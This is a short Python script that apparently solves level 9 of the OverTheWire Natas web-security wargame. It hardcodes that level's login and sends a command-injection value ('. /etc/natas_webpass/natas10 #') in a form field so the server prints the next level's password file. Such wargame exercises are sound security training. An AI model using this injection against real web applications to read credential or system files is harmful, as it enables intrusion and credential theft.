import requests
import re #regular expression

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org' % username

# HTTP POST request data = {'key' : 'value'}

data = {"needle": ". /etc/natas_webpass/natas10 #", "submit":"submit" }

# auth = (user,pass) HTTP Basic Auth

reponse = requests.post(url, auth = (username, password), data = data)

content = reponse.text

#print(content)

print(re.findall('<pre>\n(.*)\n</pre>', content)[0])
